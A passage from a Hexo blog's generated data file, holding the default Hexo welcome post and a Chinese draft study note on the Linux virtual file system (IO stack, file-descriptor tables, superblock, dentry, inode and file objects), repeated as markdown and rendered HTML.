a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"VFS 学习","date":"2023-01-25T08:55:12.000Z","_content":"# VFS\n\n怎么让很多的软件进程同时使用这些外置存储设备，而不会乱呢？直接基于物理的存储地址进行读写肯定是行不通的，过上几个月你自己可能都不记得什么数据写到哪里了。所以和内存管理不同，外部存储的管理，我们希望这些写到存储中的数据是“自描述”的某种数据格式，我们可以随时查看之前写了哪些内容，都什么时候写的。这就是文件系统的来源。\n\n存储它不应该只能保存一个文件，而是应该是多个。既然是多个，就需要组织这些文件。那么，怎么组织呢？操作系统的设计者们设计了文件系统这样的东西，来组织这些文件。虽然文件系统的种类有很多（比如：FAT32、NTFS、EXT3、EXT4 等等），但是它们有统一的抽象：文件系统是一颗树；节点要么是目录，要么是文件；文件必然是叶节点；根节点是目录，目录可以有子节点。\n文件系统以文件和树形目录的抽象逻辑概念代替了硬盘和光盘等物理设备中的数据块的概念，用户使用文件系统来保存数据时，只需要知道文件路径而不必关心数据实际保存在硬盘的数据块地址。设备上存储空间的分配和释放由文件系统自动完成，用户只需要记住数据被存入哪个文件即可。\n\n## IO 栈\n我们习惯了网络协议栈，但很少提io栈。请描述一下文件的 io 栈？\n\nIO 从用户态走系统调用进到内核，内核的路径：VFS → 文件系统 → 块层 → SCSI 层 。\nVFS （ Virtual File System 、Virtual FileSystem Switch ）层是 Linux 针对文件概念封装的一层通用逻辑，它做的事情其实非常简单，就是把所有文件系统的共性的东西抽象出来，比如 file ，inode ，dentry 等结构体，针对这些结构体抽象出通用的 api 接口，然后具体的文件系统则只需要按照接口去实现这些接口即可，在 IO 下来的时候，VFS 层使用到文件所在的文件系统的对应接口。它的作用：为上层抽象统一的操作界面，在 IO 路径上切换不同的文件系统。\n文件系统，对上抽象一个文件的概念，把数据按照策略存储到块设备上。文件系统管理的是一个线性的空间（分区，块设备），而用户看到的却是文件的概念，这一层的转化就是文件系统来做的。它负责把用户的数据按照自己制定的规则存储到块设备上。比如是按照 4K 切块存，还是按照 1M 切块存储，这些都是文件系统自己说了算。它这一层就是做了一层空间的映射转化，文件的虚拟空间到实际线性设备的映射。这层映射最关键的是 address_space 相关的接口来做。\n块层，块层其实在真实的硬件之上又抽象了一层，屏蔽不同的硬件驱动，块设备看起来就是一个线性空间而已。块层主要还是 IO 调度策略的实现，尽可能收集批量 IO 聚合下发，让 IO 尽可能的顺序，合并 IO 请求减少 IO 次数等等；划重点：块层主要做的是 IO 调度策略的一些优化。比如最出名的电梯算法就是在这里。Linux 块层 IO 子系统\nSCSI 层，SCSI 层这个就不用多说了，这个就是硬件的驱动而已，本质就是个翻译器。SCSI 层里面按照细分又会细分多层出来。它是给你的磁盘做最后一道程序，SCSI 层负责和磁盘硬件做转换，IO 交给它就能顺利的到达磁盘硬件。\n## 进程与文件系统\n进程的文件位置等信息（当前目录等）是由fs_struct 来描述的\n```\n//file:include/linux/fs_struct.h\nstruct fs_struct {\n\tint users;\n\tspinlock_t lock;\n\tseqcount_spinlock_t seq;\n\tint umask;\n\tint in_exec;\n\tstruct path root, pwd;\n} __randomize_layout;\n//file:include/linux/path.h\nstruct path {\n\tstruct vfsmount *mnt;\n\tstruct dentry *dentry;\n} __randomize_layout;\n```\n进程打开的文件信息：每个进程用一个files_struct 结构来记录文件描述符的使用情况\n```\nstruct files_struct {\n  /*\n   * read mostly part\n   */\n\tatomic_t count;\n\tbool resize_in_progress;\n\twait_queue_head_t resize_wait;\n\n\tstruct fdtable __rcu *fdt; //fdtable \n\tstruct fdtable fdtab;\n  /*\n   * written part on a separate cache line in SMP\n   */\n\tspinlock_t file_lock ____cacheline_aligned_in_smp;\n\tunsigned int next_fd; //下一个要分配的文件句柄号\n\tunsigned long close_on_exec_init[1];\n\tunsigned long open_fds_init[1];\n\tunsigned long full_fds_bits_init[1];\n\tstruct file __rcu * fd_array[NR_OPEN_DEFAULT];\n};\n\nstruct fdtable {\n\tunsigned int max_fds;\n\tstruct file __rcu **fd;      /* current fd array */ //当前文件数组\n\tunsigned long *close_on_exec;\n\tunsigned long *open_fds;\n\tunsigned long *full_fds_bits;\n\tstruct rcu_head rcu;\n};\n```\nfdtable.fd数组的下标就是文件描述符，其中 0、1、2 三个描述符总是默认分配给标准输入、标准输出和标准错误。在数组元素中记录了当前进程打开的每一个文件的指针。这个文件是 Linux 中抽象的文件，可能是真的磁盘上的文件，也可能是一个 socket。\n\n## vfs\n\n![整体逻辑图](../pic/linux_vfs.png)\n文件系统为应用程序提供了一个逻辑视图，具体是一棵倒立的树结构，方便用户管理众多文件。\n内部实现：Linux 对超级块结构/superblock、目录结构/dentry，inode 结构以及数据块做了抽象，把这些结构加入了操作函数集合，形成了 VFS，即虚拟文件系统。只要软件模块能提供上述四大核心结构的操作函数集合，生成超级块结构，就可以形成一个文件系统实例，安装到 VFS 中。有了 VFS 层就可以向上为应用程序提供统一的接口，向下兼容不同的文件系统，让 Linux 能够同时安装不同的文件系统。\n\n### vfs 的基本概念\n\nVFS有四大对象：super_block、dentry、inode和file，贯穿了VFS的设计。\n\n* super_block：超级块。存放挂载的文件系统的相关信息，挂载Binder文件系统到全局文件系统树时，会创建属于它的super_block。\n* dentry：目录项。文件系统将目录也当作文件，目录的数据由目录项组成，而每个目录项存储一个目录或文件的名称、对应的inode等内容。open一个文件\"/home/xxx/yyy.txt\"，那么/、home、xxx、yyy.txt都是一个文件路径组件（组件这词主要来自源码中的component），都有一个对应的dentry。\n* inode：索引节点。描述磁盘上的一个文件元数据（文件属性、位置等）。\n* file：文件对象。open()时创建，close()时销毁。open一个文件/home/xxx/yyy.txt，会用file来记录yyy.txt对应的inode、dentry以及file_operations。\n![四大对象关系](../pic/vfs_four_object.webp)\n\n* 一个文件系统中，只会有一个super_block。\n* dentry中有指向super_block的指针，即d_sb。dentry中有指向它对应的inode的指针，即d_inode。dentry中有指向它的父dentry的指针，即d_parent。\n* 多个dentry能会指向同一个inode。不同的dentry可能是同一个inode的别名，inode里有个i_dentry字段，它是一个链表，链表的节点是dentry里的d_alias。当持有一个inode对象时，利用i_dentry和d_adlias，我们可以通过container_of获取到对应的dentry。详见d_find_alias()。//这个改怎么理解\n* inode中有指向super_block的指针，即i_sb。\n* file中有指向对应的inode的指针，即f_inode。file里的f_path是结构体path的对象，它记录了指向对应的dentry的指针。\n* file中的f_op，通常等价于对应的inode的i_fop。f_op是结构体file_operations的对象，记录着一些函数指针，代表系统调用open()的目标文件所支持的操作，比如open()、read()、write()等。\n\n### vfs的挂载\n\n\n","source":"_drafts/vfs.md","raw":"title:  VFS 学习\ndate: 2023-01-25 16:55:12\ntags:\n---\n# VFS\n\n怎么让很多的软件进程同时使用这些外置存储设备，而不会乱呢？直接基于物理的存储地址进行读写肯定是行不通的，过上几个月你自己可能都不记得什么数据写到哪里了。所以和内存管理不同，外部存储的管理，我们希望这些写到存储中的数据是“自描述”的某种数据格式，我们可以随时查看之前写了哪些内容，都什么时候写的。这就是文件系统的来源。\n\n存储它不应该只能保存一个文件，而是应该是多个。既然是多个，就需要组织这些文件。那么，怎么组织呢？操作系统的设计者们设计了文件系统这样的东西，来组织这些文件。虽然文件系统的种类有很多（比如：FAT32、NTFS、EXT3、EXT4 等等），但是它们有统一的抽象：文件系统是一颗树；节点要么是目录，要么是文件；文件必然是叶节点；根节点是目录，目录可以有子节点。\n文件系统以文件和树形目录的抽象逻辑概念代替了硬盘和光盘等物理设备中的数据块的概念，用户使用文件系统来保存数据时，只需要知道文件路径而不必关心数据实际保存在硬盘的数据块地址。设备上存储空间的分配和释放由文件系统自动完成，用户只需要记住数据被存入哪个文件即可。\n\n## IO 栈\n我们习惯了网络协议栈，但很少提io栈。请描述一下文件的 io 栈？\n\nIO 从用户态走系统调用进到内核，内核的路径：VFS → 文件系统 → 块层 → SCSI 层 。\nVFS （ Virtual File System 、Virtual FileSystem Switch ）层是 Linux 针对文件概念封装的一层通用逻辑，它做的事情其实非常简单，就是把所有文件系统的共性的东西抽象出来，比如 file ，inode ，dentry 等结构体，针对这些结构体抽象出通用的 api 接口，然后具体的文件系统则只需要按照接口去实现这些接口即可，在 IO 下来的时候，VFS 层使用到文件所在的文件系统的对应接口。它的作用：为上层抽象统一的操作界面，在 IO 路径上切换不同的文件系统。\n文件系统，对上抽象一个文件的概念，把数据按照策略存储到块设备上。文件系统管理的是一个线性的空间（分区，块设备），而用户看到的却是文件的概念，这一层的转化就是文件系统来做的。它负责把用户的数据按照自己制定的规则存储到块设备上。比如是按照 4K 切块存，还是按照 1M 切块存储，这些都是文件系统自己说了算。它这一层就是做了一层空间的映射转化，文件的虚拟空间到实际线性设备的映射。这层映射最关键的是 address_space 相关的接口来做。\n块层，块层其实在真实的硬件之上又抽象了一层，屏蔽不同的硬件驱动，块设备看起来就是一个线性空间而已。块层主要还是 IO 调度策略的实现，尽可能收集批量 IO 聚合下发，让 IO 尽可能的顺序，合并 IO 请求减少 IO 次数等等；划重点：块层主要做的是 IO 调度策略的一些优化。比如最出名的电梯算法就是在这里。Linux 块层 IO 子系统\nSCSI 层，SCSI 层这个就不用多说了，这个就是硬件的驱动而已，本质就是个翻译器。SCSI 层里面按照细分又会细分多层出来。它是给你的磁盘做最后一道程序，SCSI 层负责和磁盘硬件做转换，IO 交给它就能顺利的到达磁盘硬件。\n## 进程与文件系统\n进程的文件位置等信息（当前目录等）是由fs_struct 来描述的\n```\n//file:include/linux/fs_struct.h\nstruct fs_struct {\n\tint users;\n\tspinlock_t lock;\n\tseqcount_spinlock_t seq;\n\tint umask;\n\tint in_exec;\n\tstruct path root, pwd;\n} __randomize_layout;\n//file:include/linux/path.h\nstruct path {\n\tstruct vfsmount *mnt;\n\tstruct dentry *dentry;\n} __randomize_layout;\n```\n进程打开的文件信息：每个进程用一个files_struct 结构来记录文件描述符的使用情况\n```\nstruct files_struct {\n  /*\n   * read mostly part\n   */\n\tatomic_t count;\n\tbool resize_in_progress;\n\twait_queue_head_t resize_wait;\n\n\tstruct fdtable __rcu *fdt; //fdtable \n\tstruct fdtable fdtab;\n  /*\n   * written part on a separate cache line in SMP\n   */\n\tspinlock_t file_lock ____cacheline_aligned_in_smp;\n\tunsigned int next_fd; //下一个要分配的文件句柄号\n\tunsigned long close_on_exec_init[1];\n\tunsigned long open_fds_init[1];\n\tunsigned long full_fds_bits_init[1];\n\tstruct file __rcu * fd_array[NR_OPEN_DEFAULT];\n};\n\nstruct fdtable {\n\tunsigned int max_fds;\n\tstruct file __rcu **fd;      /* current fd array */ //当前文件数组\n\tunsigned long *close_on_exec;\n\tunsigned long *open_fds;\n\tunsigned long *full_fds_bits;\n\tstruct rcu_head rcu;\n};\n```\nfdtable.fd数组的下标就是文件描述符，其中 0、1、2 三个描述符总是默认分配给标准输入、标准输出和标准错误。在数组元素中记录了当前进程打开的每一个文件的指针。这个文件是 Linux 中抽象的文件，可能是真的磁盘上的文件，也可能是一个 socket。\n\n## vfs\n\n![整体逻辑图](../pic/linux_vfs.png)\n文件系统为应用程序提供了一个逻辑视图，具体是一棵倒立的树结构，方便用户管理众多文件。\n内部实现：Linux 对超级块结构/superblock、目录结构/dentry，inode 结构以及数据块做了抽象，把这些结构加入了操作函数集合，形成了 VFS，即虚拟文件系统。只要软件模块能提供上述四大核心结构的操作函数集合，生成超级块结构，就可以形成一个文件系统实例，安装到 VFS 中。有了 VFS 层就可以向上为应用程序提供统一的接口，向下兼容不同的文件系统，让 Linux 能够同时安装不同的文件系统。\n\n### vfs 的基本概念\n\nVFS有四大对象：super_block、dentry、inode和file，贯穿了VFS的设计。\n\n* super_block：超级块。存放挂载的文件系统的相关信息，挂载Binder文件系统到全局文件系统树时，会创建属于它的super_block。\n* dentry：目录项。文件系统将目录也当作文件，目录的数据由目录项组成，而每个目录项存储一个目录或文件的名称、对应的inode等内容。open一个文件\"/home/xxx/yyy.txt\"，那么/、home、xxx、yyy.txt都是一个文件路径组件（组件这词主要来自源码中的component），都有一个对应的dentry。\n* inode：索引节点。描述磁盘上的一个文件元数据（文件属性、位置等）。\n* file：文件对象。open()时创建，close()时销毁。open一个文件/home/xxx/yyy.txt，会用file来记录yyy.txt对应的inode、dentry以及file_operations。\n![四大对象关系](../pic/vfs_four_object.webp)\n\n* 一个文件系统中，只会有一个super_block。\n* dentry中有指向super_block的指针，即d_sb。dentry中有指向它对应的inode的指针，即d_inode。dentry中有指向它的父dentry的指针，即d_parent。\n* 多个dentry能会指向同一个inode。不同的dentry可能是同一个inode的别名，inode里有个i_dentry字段，它是一个链表，链表的节点是dentry里的d_alias。当持有一个inode对象时，利用i_dentry和d_adlias，我们可以通过container_of获取到对应的dentry。详见d_find_alias()。//这个改怎么理解\n* inode中有指向super_block的指针，即i_sb。\n* file中有指向对应的inode的指针，即f_inode。file里的f_path是结构体path的对象，它记录了指向对应的dentry的指针。\n* file中的f_op，通常等价于对应的inode的i_fop。f_op是结构体file_operations的对象，记录着一些函数指针，代表系统调用open()的目标文件所支持的操作，比如open()、read()、write()等。\n\n### vfs的挂载\n\n\n","slug":"vfs","published":0,"updated":"2024-05-27T01:39:40.626Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit3000sv8fye0nkb0cv","content":"<h1 id=\"VFS\"><a href=\"#VFS\" class=\"headerlink\" title=\"VFS\"></a>VFS</h1><p>怎么让很多的软件进程同时使用这些外置存储设备，而不会乱呢？直接基于物理的存储地址进行读写肯定是行不通的，过上几个月你自己可能都不记得什么数据写到哪里了。所以和内存管理不同，外部存储的管理，我们希望这些写到存储中的数据是“自描述”的某种数据格式，我们可以随时查看之前写了哪些内容，都什么时候写的。这就是文件系统的来源。</p>\n<p>存储它不应该只能保存一个文件，而是应该是多个。既然是多个，就需要组织这些文件。那么，怎么组织呢？操作系统的设计者们设计了文件系统这样的东西，来组织这些文件。虽然文件系统的种类有很多（比如：FAT32、NTFS、EXT3、EXT4 等等），但是它们有统一的抽象：文件系统是一颗树；节点要么是目录，要么是文件；文件必然是叶节点；根节点是目录，目录可以有子节点。<br>文件系统以文件和树形目录的抽象逻辑概念代替了硬盘和光盘等物理设备中的数据块的概念，用户使用文件系统来保存数据时，只需要知道文件路径而不必关心数据实际保存在硬盘的数据块地址。设备上存储空间的分配和释放由文件系统自动完成，用户只需要记住数据被存入哪个文件即可。</p>\n<h2 id=\"IO-栈\"><a href=\"#IO-栈\" class=\"headerlink\" title=\"IO 栈\"></a>IO 栈</h2><p>我们习惯了网络协议栈，但很少提io栈。请描述一下文件的 io 栈？</p>\n<p>IO 从用户态走系统调用进到内核，内核的路径：VFS → 文件系统 → 块层 → SCSI 层 。<br>VFS （ Virtual File System 、Virtual FileSystem Switch ）层是 Linux 针对文件概念封装的一层通用逻辑，它做的事情其实非常简单，就是把所有文件系统的共性的东西抽象出来，比如 file ，inode ，dentry 等结构体，针对这些结构体抽象出通用的 api 接口，然后具体的文件系统则只需要按照接口去实现这些接口即可，在 IO 下来的时候，VFS 层使用到文件所在的文件系统的对应接口。它的作用：为上层抽象统一的操作界面，在 IO 路径上切换不同的文件系统。<br>文件系统，对上抽象一个文件的概念，把数据按照策略存储到块设备上。文件系统管理的是一个线性的空间（分区，块设备），而用户看到的却是文件的概念，这一层的转化就是文件系统来做的。它负责把用户的数据按照自己制定的规则存储到块设备上。比如是按照 4K 切块存，还是按照 1M 切块存储，这些都是文件系统自己说了算。它这一层就是做了一层空间的映射转化，文件的虚拟空间到实际线性设备的映射。这层映射最关键的是 address_space 相关的接口来做。<br>块层，块层其实在真实的硬件之上又抽象了一层，屏蔽不同的硬件驱动，块设备看起来就是一个线性空间而已。块层主要还是 IO 调度策略的实现，尽可能收集批量 IO 聚合下发，让 IO 尽可能的顺序，合并 IO 请求减少 IO 次数等等；划重点：块层主要做的是 IO 调度策略的一些优化。比如最出名的电梯算法就是在这里。Linux 块层 IO 子系统<br>SCSI 层，SCSI 层这个就不用多说了，这个就是硬件的驱动而已，本质就是个翻译器。SCSI 层里面按照细分又会细分多层出来。它是给你的磁盘做最后一道程序，SCSI 层负责和磁盘硬件做转换，IO 交给它就能顺利的到达磁盘硬件。</p>\n<h2 id=\"进程与文件系统\"><a href=\"#进程与文件系统\" class=\"headerlink\" title=\"进程与文件系统\"></a>进程与文件系统</h2><p>进程的文件位置等信息（当前目录等）是由fs_struct 来描述的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//file:include/linux/fs_struct.h</span><br><span class=\"line\">struct fs_struct &#123;</span><br><span class=\"line\">\tint users;</span><br><span class=\"line\">\tspinlock_t lock;</span><br><span class=\"line\">\tseqcount_spinlock_t seq;</span><br><span class=\"line\">\tint umask;</span><br><span class=\"line\">\tint in_exec;</span><br><span class=\"line\">\tstruct path root, pwd;</span><br><span class=\"line\">&#125; __randomize_layout;</span><br><span class=\"line\">//file:include/linux/path.h</span><br><span class=\"line\">struct path &#123;</span><br><span class=\"line\">\tstruct vfsmount *mnt;</span><br><span class=\"line\">\tstruct dentry *dentry;</span><br><span class=\"line\">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>\n<p>进程打开的文件信息：每个进程用一个files_struct 结构来记录文件描述符的使用情况</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct files_struct &#123;</span><br><span class=\"line\">  /*</span><br><span class=\"line\">   * read mostly part</span><br><span class=\"line\">   */</span><br><span class=\"line\">\tatomic_t count;</span><br><span class=\"line\">\tbool resize_in_progress;</span><br><span class=\"line\">\twait_queue_head_t resize_wait;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstruct fdtable __rcu *fdt; //fdtable </span><br><span class=\"line\">\tstruct fdtable fdtab;</span><br><span class=\"line\">  /*</span><br><span class=\"line\">   * written part on a separate cache line in SMP</span><br><span class=\"line\">   */</span><br><span class=\"line\">\tspinlock_t file_lock ____cacheline_aligned_in_smp;</span><br><span class=\"line\">\tunsigned int next_fd; //下一个要分配的文件句柄号</span><br><span class=\"line\">\tunsigned long close_on_exec_init[1];</span><br><span class=\"line\">\tunsigned long open_fds_init[1];</span><br><span class=\"line\">\tunsigned long full_fds_bits_init[1];</span><br><span class=\"line\">\tstruct file __rcu * fd_array[NR_OPEN_DEFAULT];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct fdtable &#123;</span><br><span class=\"line\">\tunsigned int max_fds;</span><br><span class=\"line\">\tstruct file __rcu **fd;      /* current fd array */ //当前文件数组</span><br><span class=\"line\">\tunsigned long *close_on_exec;</span><br><span class=\"line\">\tunsigned long *open_fds;</span><br><span class=\"line\">\tunsigned long *full_fds_bits;</span><br><span class=\"line\">\tstruct rcu_head rcu;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>fdtable.fd数组的下标就是文件描述符，其中 0、1、2 三个描述符总是默认分配给标准输入、标准输出和标准错误。在数组元素中记录了当前进程打开的每一个文件的指针。这个文件是 Linux 中抽象的文件，可能是真的磁盘上的文件，也可能是一个 socket。</p>\n<h2 id=\"vfs\"><a href=\"#vfs\" class=\"headerlink\" title=\"vfs\"></a>vfs</h2><p><img src=\"../pic/linux_vfs.png\" alt=\"整体逻辑图\"><br>文件系统为应用程序提供了一个逻辑视图，具体是一棵倒立的树结构，方便用户管理众多文件。<br>内部实现：Linux 对超级块结构/superblock、目录结构/dentry，inode 结构以及数据块做了抽象，把这些结构加入了操作函数集合，形成了 VFS，即虚拟文件系统。只要软件模块能提供上述四大核心结构的操作函数集合，生成超级块结构，就可以形成一个文件系统实例，安装到 VFS 中。有了 VFS 层就可以向上为应用程序提供统一的接口，向下兼容不同的文件系统，让 Linux 能够同时安装不同的文件系统。</p>\n<h3 id=\"vfs-的基本概念\"><a href=\"#vfs-的基本概念\" class=\"headerlink\" title=\"vfs 的基本概念\"></a>vfs 的基本概念</h3><p>VFS有四大对象：super_block、dentry、inode和file，贯穿了VFS的设计。</p>\n<ul>\n<li><p>super_block：超级块。存放挂载的文件系统的相关信息，挂载Binder文件系统到全局文件系统树时，会创建属于它的super_block。</p>\n</li>\n<li><p>dentry：目录项。文件系统将目录也当作文件，目录的数据由目录项组成，而每个目录项存储一个目录或文件的名称、对应的inode等内容。open一个文件”/home/xxx/yyy.txt”，那么/、home、xxx、yyy.txt都是一个文件路径组件（组件这词主要来自源码中的component），都有一个对应的dentry。</p>\n</li>\n<li><p>inode：索引节点。描述磁盘上的一个文件元数据（文件属性、位置等）。</p>\n</li>\n<li><p>file：文件对象。open()时创建，close()时销毁。open一个文件/home/xxx/yyy.txt，会用file来记录yyy.txt对应的inode、dentry以及file_operations。<br><img src=\"../pic/vfs_four_object.webp\" alt=\"四大对象关系\"></p>\n</li>\n<li><p>一个文件系统中，只会有一个super_block。</p>\n</li>\n<li><p>dentry中有指向super_block的指针，即d_sb。dentry中有指向它对应的inode的指针，即d_inode。dentry中有指向它的父dentry的指针，即d_parent。</p>\n</li>\n<li><p>多个dentry能会指向同一个inode。不同的dentry可能是同一个inode的别名，inode里有个i_dentry字段，它是一个链表，链表的节点是dentry里的d_alias。当持有一个inode对象时，利用i_dentry和d_adlias，我们可以通过container_of获取到对应的dentry。详见d_find_alias()。//这个改怎么理解</p>\n</li>\n<li><p>inode中有指向super_block的指针，即i_sb。</p>\n</li>\n<li><p>file中有指向对应的inode的指针，即f_inode。file里的f_path是结构体path的对象，它记录了指向对应的dentry的指针。</p>\n</li>\n<li><p>file中的f_op，通常等价于对应的inode的i_fop。f_op是结构体file_operations的对象，记录着一些函数指针，代表系统调用open()的目标文件所支持的操作，比如open()、read()、write()等。</p>\n</li>\n</ul>\n<h3 id=\"vfs的挂载\"><a href=\"#vfs的挂载\" class=\"headerlink\" title=\"vfs的挂载\"></a>vfs的挂载</h3>","site":{"data":{}},"cover":false,"excerpt":"","more":"<h1 id=\"VFS\"><a href=\"#VFS\" class=\"headerlink\" title=\"VFS\"></a>VFS</h1><p>怎么让很多的软件进程同时使用这些外置存储设备，而不会乱呢？直接基于物理的存储地址进行读写肯定是行不通的，过上几个月你自己可能都不记得什么数据写到哪里了。所以和内存管理不同，外部存储的管理，我们希望这些写到存储中的数据是“自描述”的某种数据格式，我们可以随时查看之前写了哪些内容，都什么时候写的。这就是文件系统的来源。</p>\n<p>存储它不应该只能保存一个文件，而是应该是多个。既然是多个，就需要组织这些文件。那么，怎么组织呢？操作系统的设计者们设计了文件系统这样的东西，来组织这些文件。虽然文件系统的种类有很多（比如：FAT32、NTFS、EXT3、EXT4 等等），但是它们有统一的抽象：文件系统是一颗树；节点要么是目录，要么是文件；文件必然是叶节点；根节点是目录，目录可以有子节点。<br>文件系统以文件和树形目录的抽象逻辑概念代替了硬盘和光盘等物理设备中的数据块的概念，用户使用文件系统来保存数据时，只需要知道文件路径而不必关心数据实际保存在硬盘的数据块地址。设备上存储空间的分配和释放由文件系统自动完成，用户只需要记住数据被存入哪个文件即可。</p>\n<h2 id=\"IO-栈\"><a href=\"#IO-栈\" class=\"headerlink\" title=\"IO 栈\"></a>IO 栈</h2><p>我们习惯了网络协议栈，但很少提io栈。请描述一下文件的 io 栈？</p>\n<p>IO 从用户态走系统调用进到内核，内核的路径：VFS → 文件系统 → 块层 → SCSI 层 。<br>VFS （ Virtual File System 、Virtual FileSystem Switch ）层是 Linux 针对文件概念封装的一层通用逻辑，它做的事情其实非常简单，就是把所有文件系统的共性的东西抽象出来，比如 file ，inode ，dentry 等结构体，针对这些结构体抽象出通用的 api 接口，然后具体的文件系统则只需要按照接口去实现这些接口即可，在 IO 下来的时候，VFS 层使用到文件所在的文件系统的对应接口。它的作用：为上层抽象统一的操作界面，在 IO 路径上切换不同的文件系统。<br>文件系统，对上抽象一个文件的概念，把数据按照策略存储到块设备上。文件系统管理的是一个线性的空间（分区，块设备），而用户看到的却是文件的概念，这一层的转化就是文件系统来做的。它负责把用户的数据按照自己制定的规则存储到块设备上。比如是按照 4K 切块存，还是按照 1M 切块存储，这些都是文件系统自己说了算。它这一层就是做了一层空间的映射转化，文件的虚拟空间到实际线性设备的映射。这层映射最关键的是 address_space 相关的接口来做。<br>块层，块层其实在真实的硬件之上又抽象了一层，屏蔽不同的硬件驱动，块设备看起来就是一个线性空间而已。块层主要还是 IO 调度策略的实现，尽可能收集批量 IO 聚合下发，让 IO 尽可能的顺序，合并 IO 请求减少 IO 次数等等；划重点：块层主要做的是 IO 调度策略的一些优化。比如最出名的电梯算法就是在这里。Linux 块层 IO 子系统<br>SCSI 层，SCSI 层这个就不用多说了，这个就是硬件的驱动而已，本质就是个翻译器。SCSI 层里面按照细分又会细分多层出来。它是给你的磁盘做最后一道程序，SCSI 层负责和磁盘硬件做转换，IO 交给它就能顺利的到达磁盘硬件。</p>\n<h2 